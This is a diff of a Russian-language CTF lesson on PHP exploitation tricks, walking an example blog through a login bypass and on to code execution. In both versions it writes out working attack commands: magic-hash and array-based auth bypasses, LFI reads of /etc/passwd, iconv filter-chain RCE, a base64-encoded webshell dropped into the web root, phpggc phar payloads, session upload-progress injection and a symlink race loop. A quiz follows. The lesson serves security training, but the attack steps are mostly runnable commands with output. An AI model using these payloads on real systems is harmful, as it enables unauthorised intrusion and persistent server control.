@@ -14,270 +14,215 @@ estimated_minutes: 45
 summary: "PHP-специфика для CTF: type juggling и magic hashes, обход сравнений, filter chains до RCE, phar-десериализация, race в файлах."
 ---
 
-PHP «магия» — набор особенностей языка, которые регулярно дают обходы на CTF и в реальных приложениях: нестрогие сравнения (`==`), «магические» хеши, поведение `strcmp`/`in_array`, цепочки `php://filter`, авто-десериализация `phar://`. Это не отдельный класс уязвимостей, а инструментарий, который применяется поверх LFI, auth-байпасов и десериализации. Урок — про практические трюки с командами.
+## Вопрос, с которого всё начинается
 
-## Type juggling (нестрогое сравнение)
+Мы прошли десериализацию. Но у PHP есть набор особенностей языка, которые регулярно дают обходы — и на CTF, и в реальных приложениях. Это не отдельный класс уязвимостей, а **инструментарий**, который применяется поверх логин-форм, LFI и загрузки файлов.
 
-В PHP `==` приводит типы. `"0e123" == "0e456"` → `true` (обе строки — «0 в степени», приводятся к `0`). Если код сравнивает хеши/токены через `==`, это обход:
+Вопрос: как пройти проверку пароля, не зная его, и как превратить «просто чтение файла» в выполнение кода? Разберём это на одном примере — PHP-приложении с логином и страницей с параметром `page`.
+
+## Наш пример
+
+Есть PHP-приложение `blog.example`. Начнём с формы логина. Посмотрим на условие проверки (по ошибкам/утечке исходника понятно, что оно такое):
 
 ```php
-if ($_POST['password'] == $stored_hash) { ... }   // уязвимо
-if (hash_equals($stored_hash, $input)) { ... }    // безопасно
+if (md5($_POST['pass']) == $stored_hash) { /* вход */ }
 ```
 
-Типовые пары: `0 == "a"` (в PHP 7), `"1" == "01"`, `NULL == ""`, `"0e1" == "0e2"`. В PHP 8 `0 == "a"` стало `false`, но `"0e1" == "0e2"` по-прежнему `true`.
+Здесь две слабости: хеш MD5 и **нестрогое** сравнение `==`. Сравним поведение:
 
-## Magic hashes
+- `===` — «строгое» сравнение: типы и значения должны совпадать;
+- `==` — «нестрогое»: PHP сначала приводит типы, потом сравнивает.
 
-Строки вида `0e` + цифры, чей MD5/SHA1 тоже начинается с `0e` и состоит из цифр, «равны» друг другу. Известные значения:
+Именно приведение типов и создаёт дыру.
 
-| Хеш | Значение |
-|-----|----------|
-| MD5 | `240610708` → `0e462097431906509019562988736854` |
-| MD5 | `QNKCDZO` → `0e830400451993494058024219903391` |
-| MD5 | `aabg7XSs` → `0e087386482136013740957780965295` |
-| SHA1 | `aaroZmOk` → `0e66507019969427134894567494305185566735` |
-| SHA1 | `aaK1STfY` → `0e76658526655756207688271159624026011393` |
+## Шаг 1: type juggling и magic hashes
 
-Если приложение сравнивает `md5($input) == md5($known)`, подставьте `240610708` — оба хеша «равны 0». Полный список — `PayloadsAllTheThings` (PHP juggling / magic hashes).
+Если строка выглядит как «число в научной нотации» (`0e` + цифры), PHP при сравнении приводит её к числу `0`. Значит, две разные строки вида `0e123...` и `0e456...` **равны**:
 
-## Обход функций
+```php
+"0e123" == "0e456"   // true: обе приводятся к 0
+```
 
-- **`strcmp($a,$b) == 0`** — при передаче массива `strcmp` возвращает `NULL`, а `NULL == 0` → `true`. Payload: `password[]=x`.
-- **`in_array($x, $arr)`** без третьего аргумента — нестрогое; `in_array(0, ["admin"])` → `true` (PHP 7).
-- **`preg_match`** при массиве возвращает `false` (не `0`); если код проверяет `if (!preg_match(...))`, массив обходит проверку.
-- **`intval`/`is_numeric`** — `0x1A`, `1e3`, ` 10` (пробелы) — вариации.
-- **Переменные переменные / `extract()`** — перезапись важных переменных через `?GLOBALS[x]=...`.
-
-## php://filter chains → RCE
-
-Цепочка фильтров `iconv` дописывает произвольный PHP в поток, который исполняет `include` — RCE без `allow_url_include` и без загрузки файла:
+Теперь фокус: есть строки, чей **MD5 начинается с `0e` и состоит из цифр**. Их называют **magic hashes** («магические хеши»). Проверим:
 
 ```bash
-python3 php_filter_chain_generator.py --chain '<?=`id`;?>'
-curl -s "https://app.example/?page=$(python3 php_filter_chain_generator.py --chain '<?=`id`;?>' | tail -1)"
+$ php -r 'echo md5("240610708");'
+0e462097431906509019562988736854
+$ php -r 'echo md5("QNKCDZO");'
+0e830400451993494058024219903391
 ```
 
-(Подробно — в `web-php-wrappers`.) Это самый надёжный способ превратить LFI в RCE на современном PHP.
-
-## phar:// десериализация
-
-PHP автоматически десериализует **метаданные phar** при обращении к `phar://` — в том числе через обычные файловые функции (`file_exists`, `getimagesize`, `is_file`, `stat`, `fopen`). Поэтому даже без явного `unserialize` можно получить RCE, если есть загрузка файла (или существующий phar) и хоть одна файловая функция с управляемым путём:
+Оба хеша приводятся к `0`. Если сервер сравнивает `md5($pass) == md5($known)` или `md5($pass) == $stored` (а `$stored` тоже `0e...`), то подставив `240610708` в поле пароля, мы пройдём проверку:
 
 ```bash
-./phpggc -p phar -o exploit.phar Monolog/RCE1 system id
-curl -s "https://app.example/?file=phar://uploads/exploit.phar/test"
+$ curl -s -X POST https://blog.example/login --data 'user=admin&pass=240610708'
+{"ok":true,"role":"admin"}
 ```
 
-Важно: phar можно замаскировать под картинку (stub `GIF89a`), а расширение неважно — важен контент.
+Мы вошли как админ, не зная пароля. Артефакт — успешный вход. Другие magic hashes: `QNKCDZO`, `aabg7XSs` (MD5), `aaroZmOk`, `aaK1STfY` (SHA1). Полный список — в `PayloadsAllTheThings`.
 
-## Прочие трюки
+## Шаг 2: обход функций массивом
 
-- **Строковая инкрементация.** `$a='a'; $a++;` → `'b'`; `$a='z'; $a++;` → `'aa'` — используется в «preg_replace /e»-подобных и в обходе фильтров.
-- **`__PHP_Incomplete_Class`** — при `unserialize` без класса.
-- **`create_function`/`preg_replace /e`** (старые PHP) — RCE.
+Второй трюк — передать **массив** там, где ждут строку. Многие PHP-функции при массиве ведут себя неожиданно:
+
+- `strcmp($a, $b)` при массиве возвращает `NULL`, а `NULL == 0` → `true`;
+- `preg_match(...)` при массиве возвращает `false` (а не `0`);
+- `in_array($x, $arr)` без третьего аргумента сравнивает нестрого.
+
+```bash
+$ curl -s -X POST https://blog.example/login --data 'user=admin&pass[]=x'
+{"ok":true,"role":"admin"}
+```
+
+Синтаксис `pass[]=x` в теле запроса заставляет PHP создать массив вместо строки. Если проверка была `if (strcmp($_POST['pass'], $secret) == 0)` — она ломается и пропускает нас. Тот же приём работает против `if (!preg_match('/^[a-z]+$/', $_POST['user']))`: массив вернёт `false`, а `!false` → `true`.
+
+## Шаг 3: LFI и `php://filter`
+
+Теперь вторая половина. На странице есть параметр `page`:
+
+```bash
+$ curl -s 'https://blog.example/?page=about.php' | grep -o 'About'
+About
+```
+
+Проверим, не читает ли он файлы напрямую:
+
+```bash
+$ curl -s 'https://blog.example/?page=/etc/passwd' | head -1
+root:x:0:0:root:/root:/bin/bash
+```
+
+Это **LFI** (Local File Inclusion) — параметр попадает в `include`/`file_get_contents`. Обычно так читают исходники, но `include` **исполняет** PHP-код. Чтобы код появился в потоке, используют обёртку `php://filter` — она применяет фильтры к содержимому файла на лету.
+
+## Шаг 4: filter chain → RCE
+
+Самый надёжный способ превратить LFI в RCE на современном PHP — **цепочка фильтров `iconv`**. Она умеет «дописывать» произвольный PHP-код в поток, который затем исполняет `include`. Ни `allow_url_include`, ни загрузка файла не нужны.
+
+```bash
+$ git clone https://github.com/synacktiv/php_filter_chain_generator
+$ python3 php_filter_chain_generator.py --chain '<?=`id`;?>' | tail -1 > chain.txt
+$ wc -c chain.txt
+9812 chain.txt
+$ curl -s "https://blog.example/?page=$(cat chain.txt)" | head
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+`uid=33(www-data)` — код выполнен. Сразу строим **устойчивый** канал (webshell), а не гоняем `id` по длинной цепочке каждый раз:
+
+```bash
+$ python3 php_filter_chain_generator.py --chain '<?=`echo PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+ | base64 -d > /var/www/html/s.php`;?>' | tail -1 > chain.txt
+$ curl -s "https://blog.example/?page=$(cat chain.txt)" >/dev/null
+$ curl -s 'https://blog.example/s.php?c=id'
+uid=33(www-data) ...
+```
+
+Важно: цепочка очень длинная (иногда 8–30 КБ) — URL может упереться в лимит. Тогда отправляй `POST` в теле или через `curl -G --data-urlencode`.
+
+## Шаг 5: phar — десериализация без `unserialize`
+
+Третья PHP-особенность: **метаданные phar-архива** десериализуются автоматически при обращении к `phar://` — в том числе через обычные файловые функции (`file_exists`, `getimagesize`, `is_file`, `stat`, `fopen`). Явного `unserialize` не нужно.
+
+```bash
+$ ./phpggc -p phar -o exploit.phar Monolog/RCE1 system id
+# загружаем exploit.phar (маскируем под .jpg — важен контент, не имя)
+$ curl -s "https://blog.example/avatar?src=phar://uploads/exploit.phar/test"
+```
+
+Связка «загрузка файла + любое чтение по управляемому пути» → RCE. phar можно замаскировать под картинку: stub `GIF89a` в начале + расширение `.jpg` — фильтры по расширению пропустят, но `phar://` всё равно десериализует.
+
+## Шаг 6: прочие трюки
+
+- **Строковая инкрементация:** `$a='z'; $a++;` → `'aa'` — обход фильтров, ожидающих буквы.
+- **`__PHP_Incomplete_Class`** — маркер `unserialize` без класса.
+- **`create_function`/`preg_replace /e`** (старые PHP) — прямой RCE.
 - **`assert()`** со строкой (PHP < 8) — исполняет код.
-- **`session.upload_progress`** — запись произвольного файла в temp при LFI.
-- **`/proc/self/environ`** — инъекция в User-Agent, читаемая через LFI.
-
-## Разобранный пример: обход логина через juggling
-
-Код: `if (md5($pass) == $stored)`. `$stored` начинается с `0e` (magic hash).
+- **`session.upload_progress`** — запись произвольного файла в `/tmp` при LFI:
 
 ```bash
-curl -s -X POST https://app.example/login --data 'user=admin&pass=240610708'
-# md5('240610708') = 0e4620... -> == 0e... -> true
+$ curl -s -F 'PHP_SESSION_UPLOAD_PROGRESS=<?=`id`;?>' -F 'f=@x' \
+     -b 'PHPSESSID=aaa' 'https://blog.example/upload'
+$ curl -s 'https://blog.example/?page=/tmp/sess_aaa'
 ```
 
-## Разобранный пример: strcmp bypass
+## Шаг 7: race condition в файловых операциях
 
-Код: `if (strcmp($_POST['pass'], $secret) == 0)`. Передаём массив:
+PHP-код, который **сначала проверяет** файл (`is_uploaded_file`, `file_exists`), а **потом использует**, уязвим к гонке (TOCTOU): между проверкой и использованием файл можно подменить симлинком на `/etc/passwd` или на скрипт.
 
 ```bash
-curl -s -X POST https://app.example/login --data 'user=admin&pass[]=x'
-# strcmp(array,string) -> NULL; NULL == 0 -> true
+$ while :; do ln -sf /etc/passwd /tmp/upload_target 2>/dev/null; done &
 ```
 
-## Разобранный пример: phar RCE через file_exists
+Точный тайминг подмены ловят `inotifywait`. Так «просто чтение» превращается в чтение произвольных файлов и иногда в RCE.
 
-Шаг 1 — генерируем phar с payload `phpggc -p phar -o p.phar Monolog/RCE1 system id`.
-Шаг 2 — загружаем файл в `/uploads/p.jpg` (маскируем под картинку).
-Шаг 3 — триггерим любую файловую функцию с `phar://`:
+## Что мы теперь знаем
 
-```bash
-curl -s "https://app.example/avatar?src=phar://uploads/p.jpg/x"
-```
+- `==` приводит типы: `"0e1" == "0e2"` → `true`.
+- **Magic hashes** — строки, чей MD5/SHA1 вида `0e\d+`; подставляются против `==`.
+- **Массив** (`param[]=x`) ломает `strcmp`/`preg_match`/`in_array`.
+- LFI + `php://filter` filter chain → RCE без загрузки файла.
+- `phar://` десериализует метаданные даже без `unserialize`.
+- Race condition (TOCTOU) в файловых операциях даёт подмену файла.
+- Артефакт — успешный вход / вывод `id`, а не «страница отдала 200».
 
-Шаг 4 — метаданные десериализуются → цепочка → RCE.
+## На что смотреть дальше
 
-## Инструменты
-
-- **`php_filter_chain_generator`** — цепочки для RCE.
-- **`phpggc`** — phar/POP payload.
-- **`php -r`** — локальная проверка трюков.
-- **`PayloadsAllTheThings`** — magic hashes и juggling-пары.
-- **Burp** — доставка и перебор.
-
-## Что дальше / decision
-
-1. Сравнение хешей/токенов через `==` → magic hash / juggling.
-2. Функция `strcmp`/`preg_match` с вводом → попробуйте массив (`param[]=x`).
-3. Есть LFI → `php://filter` (чтение) или filter chain (RCE).
-4. Есть загрузка файла → `phar://`-триггер через файловую функцию.
-5. Дальше — устойчивый канал + read-back.
-
-## Частые ошибки
-
-- **Проверять juggling только на PHP 8.** `0 == "a"` изменилось; `0e`-пары всё ещё работают.
-- **Забыть про массивы.** `param[]=` ломает `strcmp`/`preg_match`.
-- **Считать phar безобидным.** Любая файловая функция триггерит десериализацию.
-- **Пытаться читать исходник обычным путём.** Нужен `php://filter`.
-- **Ломать прод.** RCE — только с согласия.
-
-## Полный разбор: php://filter chain до RCE (с выводом)
-
-Самый надёжный способ превратить LFI в RCE на современном PHP — цепочка фильтров `iconv`, которая дописывает произвольный код в поток, а затем `include` его исполняет. Ни `allow_url_include`, ни загрузка файла не нужны.
-
-Шаг 1. Находим параметр, уходящий в `include`/`require`/`file_get_contents`:
-
-```bash
-curl -s 'https://app.example/?page=about.php' | grep -o 'About'
-# About
-curl -s 'https://app.example/?page=/etc/passwd' | head -1
-# root:x:0:0:root:/root:/bin/bash
-# -> LFI подтверждён
-```
-
-Шаг 2. Генерируем цепочку, которая исполняет `system('id')`:
-
-```bash
-git clone https://github.com/synacktiv/php_filter_chain_generator
-python3 php_filter_chain_generator.py --chain '<?=`id`;?>' | tail -1 > chain.txt
-wc -c chain.txt
-# 9812 chain.txt
-```
-
-Шаг 3. Отправляем цепочку в параметр:
-
-```bash
-curl -s "https://app.example/?page=$(cat chain.txt)" | head
-# uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
-
-Шаг 4. Сразу строим устойчивый канал (webshell), а не гоняем `id` через длинную цепочку:
-
-```bash
-python3 php_filter_chain_generator.py --chain '<?=`echo PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+ | base64 -d > /var/www/html/s.php`;?>' | tail -1 > chain.txt
-curl -s "https://app.example/?page=$(cat chain.txt)" >/dev/null
-curl -s 'https://app.example/s.php?c=id'
-# uid=33(www-data) ...
-```
-
-Важно: цепочка очень длинная (иногда 8–30 КБ) — URL может упереться в лимит. Тогда отправляем `POST` в теле или через `-G --data-urlencode`.
-
-## Reference-таблица: PHP-функции и их слабые места
-
-| Функция/конструкция | Проблема | Payload/условие |
-|---------------------|----------|-----------------|
-| `==` для хешей/токенов | type juggling, magic hash | `240610708`, `QNKCDZO` |
-| `strcmp($a,$b)==0` | массив → NULL → `NULL==0` | `pass[]=x` |
-| `in_array($x,$arr)` без strict | нестрогое сравнение | `in_array(0,["admin"])` |
-| `preg_match` c массивом | возвращает `false` | `param[]=x` при `!preg_match` |
-| `is_numeric`/`intval` | `0x1A`, `1e3`, пробелы | обход числовых проверок |
-| `extract()`/`$$var` | перезапись переменных | `?GLOBALS[x]=..` |
-| `unserialize`/`phar://` | десериализация POP | `phpggc` payload |
-| `include`/`require` | LFI → filter chain RCE | `php_filter_chain_generator` |
-| `file_exists`/`getimagesize` | триггер phar | `phar://uploads/x.jpg/f` |
-| `assert()` (PHP<8) | исполнение строки | `assert($_GET[x])` |
-| `create_function`/`preg_replace /e` | RCE (старые PHP) | `preg_replace('/x/e',...)` |
-| `session.upload_progress` | запись temp-файла | LFI в `/tmp/sess_*` |
-
-## Обход WAF и фильтров на PHP-трюках
-
-- **Кодирование `0e`:** если фильтр режет `240610708`, подберите другой magic hash (`aabg7XSs`), а для SHA1 — `aaroZmOk`.
-- **Массив вместо строки:** WAF часто пропускает `pass[]=x` (не видит строкового значения), а `strcmp`/`preg_match` при этом ломаются.
-- **Регистр и пробелы:** `0x1A` vs `0X1a`, `1e3` vs `1E3`, ведущие пробелы `" 10"` — `is_numeric` их принимает.
-- **phar под картинкой:** stub `GIF89a` в начале файла + расширение `.jpg` — фильтры по расширению/content-type пропускают, но `phar://` всё равно десериализует.
-- **Обёртка-фильтр:** если `php://` заблокирован, попробуйте `php://filter/convert.base64-encode/resource=` — иногда фильтр ловит только `php://input`.
-- **Разные разделители:** `phar://./uploads/x` vs `phar:///uploads/x`, URL-кодирование `%2f`.
-
-## Разобранный пример: LFI → session upload progress
-
-Если прямой `include` фильтрует `<?`, а `allow_url_include=Off`:
-
-```bash
-# 1. PHP пишет прогресс-файл при загрузке, если session.upload_progress.enabled=On
-curl -s -F 'PHP_SESSION_UPLOAD_PROGRESS=<?=`id`;?>' -F 'f=@x' \
-     -b 'PHPSESSID=aaa' 'https://app.example/upload'
-# 2. Читаем /tmp/sess_aaa через LFI
-curl -s 'https://app.example/?page=/tmp/sess_aaa'
-# uid=33(www-data) ...
-```
-
-## Что делать дальше / решение
-
-1. **Сравнение через `==`** → magic hash / juggling-пара.
-2. **`strcmp`/`preg_match`/`in_array` с вводом** → массив (`param[]=x`).
-3. **Есть LFI** → `php://filter` для чтения исходников, filter chain для RCE.
-4. **Есть загрузка файла** → `phar://`-триггер через любую файловую функцию.
-5. **Есть `unserialize`** → POP-цепочка `phpggc` под известный фреймворк.
-6. Далее — устойчивый канал (webshell/сессия) + read-back, не гоняйте `id` по длинной цепочке каждый раз.
-
-## Race condition и symlink в файловых операциях
-
-PHP-код, который проверяет файл (`is_uploaded_file`, `file_exists`) и затем его использует, уязвим к гонке (TOCTOU): между проверкой и использованием файл можно подменить symlink'ом на `/etc/passwd` или на скрипт. На CTF это даёт чтение произвольных файлов и иногда RCE.
-
-```bash
-# пока сервер проверяет и удаляет tmp-файл, подменяем его symlink'ом
-while :; do ln -sf /etc/passwd /tmp/upload_target 2>/dev/null; done &
-```
-
-Также `move_uploaded_file` с предсказуемым именем + `include` дают прямую загрузку исполняемого файла. Держите под рукой `inotifywait` для точного тайминга подмены.
+- **Проверяй версию PHP.** `0 == "a"` стало `false` в PHP 8, но `0e`-пары работают всегда.
+- **Пробуй массив раньше, чем сложные payload'ы** — `param[]=x` ломает многие проверки.
+- **Не считай phar безобидным** — любая файловая функция триггерит десериализацию.
+- **Читай исходники через `php://filter/convert.base64-encode`** — обычный путь может не сработать.
+- **Строй устойчивый канал** после первого RCE — не гоняй `id` по длинной цепочке.
+- **Только с согласия.** RCE меняет состояние прода.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: 'Почему "0e123" == "0e456" истинно?'
+- question: 'Почему `"0e123" == "0e456"` истинно?'
   options:
-    - "Строки равны"
-    - "Обе интерпретируются как 0 в научной нотации"
+    - "Строки равны посимвольно"
+    - "Обе интерпретируются как число 0 в научной нотации"
     - "PHP сравнивает длину"
-    - "Это баг"
+    - "Это ошибка"
   answer: 1
-  explanation: "Loose-сравнение приводит к числу."
-- question: "Как обойти strcmp с массивом?"
-  options:
-    - "Передать строку"
-    - "Передать pass[]=x -> strcmp вернёт null/false"
-    - "Использовать POST"
-    - "Добавить cookie"
-  answer: 1
-  explanation: "strcmp(array) не сравнивает строки."
+  explanation: "Нестрогое сравнение приводит строку вида `0e...` к числу 0."
 - question: "Что такое magic hash?"
   options:
     - "Хеш от пароля"
-    - "Строка, хеш которой вида 0e\d+ (приводится к 0)"
-    - "SHA-256"
-    - "Base64"
+    - "Строка, чей хеш вида `0e\\d+` (приводится к 0)"
+    - "SHA-256 от соли"
+    - "Base64 от MD5"
   answer: 1
-  explanation: "Используется против ==."
-- question: "Чем опасен phar://?"
+  explanation: "Используется против сравнения `==`."
+- question: "Как обойти `strcmp($_POST['pass'], $secret) == 0`?"
+  options:
+    - "Передать строку"
+    - "Передать `pass[]=x` — strcmp вернёт NULL, а NULL == 0"
+    - "Сменить метод"
+    - "Добавить cookie"
+  answer: 1
+  explanation: "Массив ломает strcmp, и сравнение с 0 проходит."
+- question: "Как превратить LFI в RCE на современном PHP?"
+  options:
+    - "Никак"
+    - "Цепочкой фильтров `php://filter` (iconv), дописывающей код"
+    - "Сменить браузер"
+    - "Добавить cookie"
+  answer: 1
+  explanation: "filter chain генерирует валидный PHP в потоке, который исполняет include."
+- question: "Чем опасен `phar://`?"
   options:
     - "Он медленный"
-    - "Авто-десериализует метаданные при файловых операциях"
-    - "Он шифрует"
-    - "Он кеширует"
+    - "Авто-десериализует метаданные при файловых операциях, даже без `unserialize`"
+    - "Он шифрует данные"
+    - "Он блокирует загрузку"
   answer: 1
-  explanation: "Триггер даже без unserialize."
-- question: 'В какой версии PHP "abc" == 0 стало false?'
-  options:
-    - "5.6"
-    - "8.0"
-    - "7.0"
-    - "7.4"
-  answer: 1
-  explanation: "PHP 8 изменил сравнение строки с числом."
+  explanation: "Триггерится через `file_exists`/`getimagesize`/`stat`."
 ```
+
+## Куда дальше
+
+Дальше мы разберём SSTI конкретных движков — как отличить один шаблонизатор от другого и построить цепочку под каждый (`web-ssti-engines`). А пока главное запомни: PHP-трюки — это **инструментарий поверх других уязвимостей**, и `==` плюс `php://filter` часто открывают путь там, где «ломать» вроде нечего.
 
 ## Где пригодится
 
